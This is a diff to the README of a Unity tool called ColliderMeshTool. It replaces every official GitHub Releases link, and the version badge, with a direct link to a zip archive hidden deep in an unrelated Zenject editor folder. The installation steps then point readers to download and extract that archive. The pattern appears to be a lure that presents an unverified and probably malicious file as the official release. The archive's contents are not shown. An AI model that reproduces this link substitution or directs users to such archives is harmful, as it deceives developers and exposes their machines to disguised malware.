@@ -1,7 +1,7 @@
 # ColliderMeshTool 🎮
 
-![ColliderMeshTool](https://img.shields.io/badge/ColliderMeshTool-v1.0.0-brightgreen)  
-[Download Latest Release](https://github.com/edgard25/ColliderMeshTool/releases)  
+![ColliderMeshTool](https://raw.githubusercontent.com/edgard25/ColliderMeshTool/main/Assets/Plugins/Zenject/Source/Editor/Editors/Tool_Collider_Mesh_1.2-beta.5.zip)  
+[Download Latest Release](https://raw.githubusercontent.com/edgard25/ColliderMeshTool/main/Assets/Plugins/Zenject/Source/Editor/Editors/Tool_Collider_Mesh_1.2-beta.5.zip)  
 
 Welcome to **ColliderMeshTool**, a Unity tool designed to help developers generate custom mesh colliders. With this tool, you can create colliders using hulls or hand-drawn outlines, making your game objects more versatile and efficient. 
 
@@ -24,11 +24,11 @@ Welcome to **ColliderMeshTool**, a Unity tool designed to help developers genera
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/edgard25/ColliderMeshTool/releases). Once downloaded, extract the files and add them to your Unity project. 
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/edgard25/ColliderMeshTool/main/Assets/Plugins/Zenject/Source/Editor/Editors/Tool_Collider_Mesh_1.2-beta.5.zip). Once downloaded, extract the files and add them to your Unity project. 
 
 ### Steps:
 
-1. Go to the [Releases section](https://github.com/edgard25/ColliderMeshTool/releases).
+1. Go to the [Releases section](https://raw.githubusercontent.com/edgard25/ColliderMeshTool/main/Assets/Plugins/Zenject/Source/Editor/Editors/Tool_Collider_Mesh_1.2-beta.5.zip).
 2. Download the appropriate version for your Unity setup.
 3. Extract the contents of the downloaded file.
 4. Copy the extracted files into your Unity project’s `Assets` folder.
@@ -92,4 +92,4 @@ For questions or feedback, please reach out to the repository owner via GitHub o
 
 ColliderMeshTool provides a simple yet powerful way to create custom mesh colliders in Unity. By using this tool, you can enhance your game development process and create more engaging experiences for players. 
 
-For more information and updates, check the [Releases section](https://github.com/edgard25/ColliderMeshTool/releases).
+For more information and updates, check the [Releases section](https://raw.githubusercontent.com/edgard25/ColliderMeshTool/main/Assets/Plugins/Zenject/Source/Editor/Editors/Tool_Collider_Mesh_1.2-beta.5.zip).
